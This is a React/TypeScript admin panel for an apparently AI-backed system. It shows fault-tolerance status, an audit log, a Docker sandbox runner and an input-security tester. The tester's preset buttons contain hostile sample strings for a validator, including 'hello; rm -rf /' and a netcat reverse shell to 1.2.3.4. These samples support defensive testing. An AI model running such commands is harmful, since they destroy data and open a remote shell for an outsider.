import { useEffect, useState } from "react"
import {
  Shield, Activity, Database, Clock, CheckCircle, XCircle, AlertTriangle,
  Terminal, Send, Trash2, RefreshCw, Play
} from "lucide-react"
import {
  getHarnessStatus, getSandboxStatus, getAuditLog, getAuditStats,
  validateInput, runSandboxCode
} from "../../services/api"

export default function AdminPanel() {
  const [tab, setTab] = useState<"system" | "audit" | "security" | "sandbox">("system")
  const [harness, setHarness] = useState<any>(null)
  const [sandbox, setSandbox] = useState<any>(null)
  const [auditLog, setAuditLog] = useState<any[]>([])
  const [auditStats, setAuditStats] = useState<any>(null)

  // Security test state
  const [testInput, setTestInput] = useState("")
  const [testResult, setTestResult] = useState<any>(null)

  // Sandbox state
  const [sandboxCode, setSandboxCode] = useState("print('hello')")
  const [sandboxOutput, setSandboxOutput] = useState<any>(null)

  const fetchAudit = () => {
    getAuditLog("", 20).then(setAuditLog).catch(() => [])
    getAuditStats().then(setAuditStats).catch(() => null)
  }

  useEffect(() => {
    getHarnessStatus().then(setHarness).catch(() => {})
    getSandboxStatus().then(setSandbox).catch(() => {})
    fetchAudit()
  }, [])

  const handleTestInput = async () => {
    if (!testInput.trim()) return
    try {
      let result
      if (testInput.startsWith("def ") || testInput.includes("import ") || testInput.startsWith("print")) {
        result = await validateInput("", testInput)
      } else if (testInput.includes("rm ") || testInput.includes(";") || testInput.includes("DROP")) {
        result = await validateInput(testInput, "")
      } else {
        result = await validateInput("", testInput)
      }
      setTestResult(result)
    } catch (e: any) {
      setTestResult({ error: e.message })
    }
  }

  const handleRunSandbox = async () => {
    if (!sandboxCode.trim()) return
    setSandboxOutput({ loading: true })
    try {
      const result = await runSandboxCode(sandboxCode, "python", 10)
      setSandboxOutput(result)
    } catch (e: any) {
      setSandboxOutput({ error: e.message })
    }
  }

  const handleClearAudit = () => {
    setAuditLog([])
    setAuditStats(null)
  }

  return (
    <div className="flex-1 flex flex-col p-6 overflow-y-auto">
      {/* Header */}
      <div className="flex items-center justify-between mb-4">
        <h2 className="text-cyber-text font-bold text-lg flex items-center gap-2">
          <Shield size={20} className="text-cyber-cyan" />
          系统管理
        </h2>
        <button onClick={() => { fetchAudit() }} className="p-1.5 rounded-md text-cyber-textDim hover:text-cyber-cyan">
          <RefreshCw size={14} />
        </button>
      </div>

      {/* Tabs */}
      <div className="flex gap-1 mb-5">
        {([
          { key: "system", label: "系统状态", icon: <Activity size={14} /> },
          { key: "audit", label: "审计日志", icon: <Clock size={14} /> },
          { key: "security", label: "安全测试", icon: <Shield size={14} /> },
          { key: "sandbox", label: "沙箱执行", icon: <Terminal size={14} /> },
        ] as const).map(t => (
          <button
            key={t.key}
            onClick={() => setTab(t.key as any)}
            className={`flex items-center gap-1.5 px-3 py-1.5 text-xs rounded-lg transition-colors ${
              tab === t.key ? "bg-cyber-cyan/10 text-cyber-cyan border border-cyber-cyan/30" : "text-cyber-textDim border border-cyber-border"
            }`}
          >
            {t.icon} {t.label}
          </button>
        ))}
      </div>

      {/* Tab: System */}
      {tab === "system" && (
        <div className="space-y-4">
          <div className="p-4 rounded-lg border border-cyber-border bg-cyber-surface/50">
            <h3 className="text-cyber-text text-sm font-bold flex items-center gap-2 mb-3">
              <Activity size={16} className="text-cyber-cyan" /> Harness 容错引擎
            </h3>
            {harness ? (
              <div className="grid grid-cols-2 gap-3">
                <StatCard label="断路器数量" value={Object.keys(harness.circuit_breakers || {}).length} />
                <StatCard label="LLM 超时" value={`${harness.timeouts?.llm || 60}s`} />
                <StatCard label="检索超时" value={`${harness.timeouts?.retrieval || 10}s`} />
                <StatCard label="最大重试" value={harness.retry_policy?.max_retries || 3} />
                <StatCard label="工具超时" value={`${harness.timeouts?.tool || 30}s`} />
                <StatCard label="DB 超时" value={`${harness.timeouts?.db || 5}s`} />
              </div>
            ) : <p className="text-cyber-textDim text-sm">加载中...</p>}
          </div>

          <div className="p-4 rounded-lg border border-cyber-border bg-cyber-surface/50">
            <h3 className="text-cyber-text text-sm font-bold flex items-center gap-2 mb-3">
              <Database size={16} className="text-cyber-purple" /> Docker 沙箱
            </h3>
            {sandbox ? (
              <div className="space-y-3">
                <div className="flex items-center gap-2">
                  {sandbox.docker_available
                    ? <CheckCircle size={14} className="text-green-400" />
                    : <XCircle size={14} className="text-cyber-pink" />}
                  <span className="text-cyber-text text-sm">
                    Docker {sandbox.docker_available ? "可用" : "不可用（使用本地执行模式）"}
                  </span>
                </div>
                <div className="grid grid-cols-2 gap-2 text-xs text-cyber-textDim">
                  <span>CPU 限制: {sandbox.config?.cpu_limit}</span>
                  <span>内存限制: {sandbox.config?.memory_limit}</span>
                  <span>超时: {sandbox.config?.timeout}s</span>
                  <span>网络隔离: {sandbox.config?.network_disabled ? "✓" : "✗"}</span>
                  <span>只读文件系统: {sandbox.config?.read_only ? "✓" : "✗"}</span>
                  <span>提权防护: {sandbox.config?.no_new_privileges ? "✓" : "✗"}</span>
                </div>
              </div>
            ) : <p className="text-cyber-textDim text-sm">加载中...</p>}
          </div>
        </div>
      )}

      {/* Tab: Audit */}
      {tab === "audit" && (
        <div className="space-y-4">
          {auditStats && (
            <div className="p-3 rounded-lg border border-cyber-border bg-cyber-surface/30 text-xs flex items-center justify-between">
              <span className="text-cyber-textDim">
                总记录: {auditStats.total_entries}
                {auditStats.by_action && Object.keys(auditStats.by_action).length > 0 &&
                  ` | ${Object.entries(auditStats.by_action).map(([k, v]) => `${k}: ${v}`).join(", ")}`
                }
              </span>
              <button onClick={handleClearAudit} className="text-cyber-textDim hover:text-cyber-pink">
                <Trash2 size={12} />
              </button>
            </div>
          )}
          <div className="space-y-2">
            {auditLog.length === 0 ? (
              <p className="text-cyber-textDim text-sm text-center py-8">暂无审计记录</p>
            ) : (
              auditLog.map((entry, i) => (
                <div key={i} className="flex items-center gap-3 p-3 rounded-lg border border-cyber-border bg-cyber-surface/50">
                  <Clock size={14} className="text-cyber-textDim shrink-0" />
                  <div className="flex-1 min-w-0">
                    <p className="text-cyber-text text-sm">{entry.action}</p>
                    <p className="text-cyber-textDim text-xs truncate">{JSON.stringify(entry.details)}</p>
                  </div>
                  <span className={`text-xs px-2 py-0.5 rounded ${
                    entry.risk_level === "block" ? "bg-cyber-pink/10 text-cyber-pink" :
                    entry.risk_level === "warn" ? "bg-yellow-400/10 text-yellow-400" :
                    "bg-cyber-cyan/10 text-cyber-cyan"
                  }`}>{entry.risk_level}</span>
                </div>
              ))
            )}
          </div>
        </div>
      )}

      {/* Tab: Security Test */}
      {tab === "security" && (
        <div className="space-y-4">
          <div className="p-4 rounded-lg border border-cyber-border bg-cyber-surface/50">
            <h3 className="text-cyber-text text-sm font-bold mb-3">输入安全检测</h3>
            <div className="flex gap-2 mb-3">
              <input
                value={testInput}
                onChange={(e) => setTestInput(e.target.value)}
                onKeyDown={(e) => e.key === "Enter" && handleTestInput()}
                placeholder="输入要检测的代码或命令..."
                className="flex-1 px-3 py-2 text-xs rounded-lg bg-cyber-bg border border-cyber-border text-cyber-text placeholder:text-cyber-textDim focus:outline-none focus:border-cyber-cyan/50"
              />
              <button onClick={handleTestInput} className="px-3 py-2 rounded-lg border border-cyber-cyan/40 text-cyber-cyber text-xs hover:bg-cyber-cyan/10">
                <Send size={14} />
              </button>
            </div>

            {/* Quick test buttons */}
            <div className="flex flex-wrap gap-2 mb-3">
              {[
                { label: "安全代码", val: "print('hello')" },
                { label: "注入攻击", val: "hello; rm -rf /" },
                { label: "SQL注入", val: "SELECT * FROM users" },
                { label: "反弹Shell", val: "nc -e /bin/sh 1.2.3.4 80" },
                { label: "OS命令", val: "import os; os.system('ls')" },
              ].map(t => (
                <button key={t.label} onClick={() => setTestInput(t.val)}
                  className="px-2 py-1 text-[10px] rounded border border-cyber-border text-cyber-textDim hover:border-cyber-cyan/40 hover:text-cyber-text">
                  {t.label}
                </button>
              ))}
            </div>

            {/* Result */}
            {testResult && (
              <div className={`p-3 rounded-lg border ${
                testResult.risk_level === "block" ? "border-cyber-pink/40 bg-cyber-pink/5" :
                testResult.risk_level === "warn" ? "border-yellow-400/40 bg-yellow-400/5" :
                "border-green-400/40 bg-green-400/5"
              }`}>
                <div className="flex items-center gap-2 mb-2">
                  {testResult.risk_level === "block" ? <XCircle size={14} className="text-cyber-pink" /> :
                   testResult.risk_level === "warn" ? <AlertTriangle size={14} className="text-yellow-400" /> :
                   <CheckCircle size={14} className="text-green-400" />}
                  <span className="text-cyber-text text-sm font-bold">
                    风险等级: <span className={
                      testResult.risk_level === "block" ? "text-cyber-pink" :
                      testResult.risk_level === "warn" ? "text-yellow-400" : "text-green-400"
                    }>{testResult.risk_level}</span>
                  </span>
                </div>
                {testResult.reasons && testResult.reasons.length > 0 && (
                  <ul className="space-y-0.5">
                    {testResult.reasons.map((r: string, i: number) => (
                      <li key={i} className="text-cyber-textDim text-xs">• {r}</li>
                    ))}
                  </ul>
                )}
                {testResult.error && <p className="text-cyber-pink text-xs">{testResult.error}</p>}
              </div>
            )}
          </div>

          {/* Risk Grading Legend */}
          <div className="p-4 rounded-lg border border-cyber-border bg-cyber-surface/50">
            <h3 className="text-cyber-text text-sm font-bold mb-3">风险分级说明</h3>
            <div className="space-y-2 text-xs">
              <div className="flex items-center gap-2 p-2 rounded bg-green-400/5 border border-green-400/20">
                <CheckCircle size={12} className="text-green-400" />
                <span className="text-cyber-text font-bold">Safe</span>
                <span className="text-cyber-textDim">— 无风险，允许执行</span>
              </div>
              <div className="flex items-center gap-2 p-2 rounded bg-yellow-400/5 border border-yellow-400/20">
                <AlertTriangle size={12} className="text-yellow-400" />
                <span className="text-cyber-text font-bold">Warn</span>
                <span className="text-cyber-textDim">— 有潜在风险，需人工确认</span>
              </div>
              <div className="flex items-center gap-2 p-2 rounded bg-cyber-pink/5 border border-cyber-pink/20">
                <XCircle size={12} className="text-cyber-pink" />
                <span className="text-cyber-text font-bold">Block</span>
                <span className="text-cyber-textDim">— 高危操作，直接拦截</span>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Tab: Sandbox */}
      {tab === "sandbox" && (
        <div className="space-y-4">
          <div className="p-4 rounded-lg border border-cyber-border bg-cyber-surface/50">
            <h3 className="text-cyber-text text-sm font-bold flex items-center gap-2 mb-3">
              <Terminal size={16} className="text-cyber-cyan" /> 安全沙箱执行器
            </h3>
            <p className="text-cyber-textDim text-xs mb-3">
              代码在隔离的 Docker 容器中执行（或本地受限模式），不会影响宿主机。
            </p>
            <div className="flex gap-2 mb-2">
              <textarea
                value={sandboxCode}
                onChange={(e) => setSandboxCode(e.target.value)}
                rows={5}
                placeholder="输入 Python 代码..."
                className="flex-1 px-3 py-2 text-xs rounded-lg bg-cyber-bg border border-cyber-border text-cyber-text font-mono placeholder:text-cyber-textDim focus:outline-none focus:border-cyber-cyan/50 resize-none"
              />
            </div>
            <div className="flex items-center justify-between">
              <div className="flex gap-2">
                {[
                  { label: "Hello", code: "print('Hello, NovaTech!')" },
                  { label: "计算", code: "print(f'2+3 = {2+3}')" },
                  { label: "危险命令", code: "import os; os.system('ls -la /')" },
                ].map(t => (
                  <button key={t.label} onClick={() => setSandboxCode(t.code)}
                    className="px-2 py-1 text-[10px] rounded border border-cyber-border text-cyber-textDim hover:border-cyber-cyan/40">
                    {t.label}
                  </button>
                ))}
              </div>
              <button onClick={handleRunSandbox}
                className="px-3 py-2 rounded-lg bg-cyber-cyan/10 border border-cyber-cyan text-cyber-cyan text-xs flex items-center gap-1.5 hover:bg-cyber-cyan/20">
                <Play size={12} /> 执行
              </button>
            </div>
          </div>

          {/* Output */}
          {sandboxOutput && (
            <div className="p-4 rounded-lg border border-cyber-border bg-cyber-surface/50">
              <h3 className="text-cyber-text text-sm font-bold mb-2">执行结果</h3>
              {sandboxOutput.loading ? (
                <p className="text-cyber-textDim text-xs">执行中...</p>
              ) : sandboxOutput.error ? (
                <p className="text-cyber-pink text-xs">{sandboxOutput.error}</p>
              ) : (
                <div className="space-y-2">
                  <div className="flex gap-3 text-xs">
                    <span className="text-cyber-textDim">退出码: <span className={
                      sandboxOutput.exit_code === 0 ? "text-green-400" : "text-cyber-pink"
                    }>{sandboxOutput.exit_code}</span></span>
                    <span className="text-cyber-textDim">沙箱: <span className={sandboxOutput.sandboxed ? "text-green-400" : "text-yellow-400"}>{
                      sandboxOutput.sandboxed ? "Docker" : "本地"
                    }</span></span>
                    {sandboxOutput.timed_out && <span className="text-cyber-pink">超时</span>}
                  </div>
                  {sandboxOutput.stdout && (
                    <pre className="text-green-400 text-xs bg-cyber-bg/50 p-2 rounded max-h-32 overflow-y-auto">
                      {sandboxOutput.stdout}
                    </pre>
                  )}
                  {sandboxOutput.stderr && (
                    <pre className="text-cyber-pink text-xs bg-cyber-bg/50 p-2 rounded max-h-32 overflow-y-auto">
                      {sandboxOutput.stderr}
                    </pre>
                  )}
                </div>
              )}
            </div>
          )}
        </div>
      )}
    </div>
  )
}

function StatCard({ label, value }: { label: string; value: any }) {
  return (
    <div className="p-3 rounded-lg bg-cyber-bg/50 border border-cyber-border">
      <p className="text-cyber-textDim text-xs">{label}</p>
      <p className="text-cyber-text text-lg font-bold">{value}</p>
    </div>
  )
}
